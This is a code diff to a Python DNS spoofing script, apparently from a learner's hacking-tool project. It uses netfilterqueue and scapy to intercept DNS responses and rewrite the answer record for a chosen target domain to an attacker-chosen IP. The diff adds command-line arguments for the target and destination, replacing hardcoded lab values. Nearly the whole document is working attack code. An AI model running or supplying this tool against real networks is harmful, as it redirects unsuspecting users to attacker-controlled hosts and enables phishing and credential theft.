@@ -6,17 +6,33 @@
 import netfilterqueue
 import subprocess
 import scapy.all as scapy
+import argparse
+
+def get_arguments(): # Function to get arguments in command line
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--target', dest = "target_website", help = "Target website you want to spoof")
+    parser.add_argument('-d', '--destination', dest = "destination_website", help = "Destination website you want to forward the target")
+    options = parser.parse_args()
+    if not options.target_website:
+        parser.error("[-] Please specify the target webiste, use --help for more info")
+    elif not options.destination_website:
+        parser.error("[-] Please specify the destination IP, use --help for more info")
+    else:
+        return options
 
 def process_packet(packet):
     #print(packet)
     #print(packet.get_payload()) # Getting payload
+
     scapy_packet = scapy.IP(packet.get_payload()) # Coverting the packet to scapy packet so that we can interact with them.
     if scapy_packet.haslayer(scapy.DNSRR): # Finding the DNS for specific site
         qname = scapy_packet[scapy.DNSQR].qname # DNSQR is Question Record for DNS
     # DNSRQ is for DNS Request and for DNS Response we use DNSRR
-        if "www.vulnweb.com" in str(qname):
+        #if "www.vulnweb.com" in str(qname):
+        if target_website in str(qname):
             print("[+] Spoofing Target ")
-            answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.5") # Modifying the DNS Record
+            #answer = scapy.DNSRR(rrname = qname, rdata = "85.128.197.105") # Modifying the DNS Record
+            answer = scapy.DNSRR(rrname = qname, rdata = destination_website)
         #print(scapy_packet.show())
             scapy_packet[scapy.DNS].an = answer # Implementing the changes
             scapy_packet[scapy.DNS].ancount = 1 # Modifing ancount(answer count to 1)
@@ -35,6 +51,9 @@ def process_packet(packet):
     packet.accept()
 
 try:
+    options = get_arguments()
+    target_website = options.target_website
+    destination_website = options.destination_website
     choice = input("\n1 - Intersystem DNS Spoofing\n2 - Intrasystem DNS Spoofing\nEnter your choice: ")
     #print(choice)
     if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
@@ -47,6 +66,8 @@ try:
     else:
         print("[-] Invalid Choice.... Exiting.....")
         exit()
+
+
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
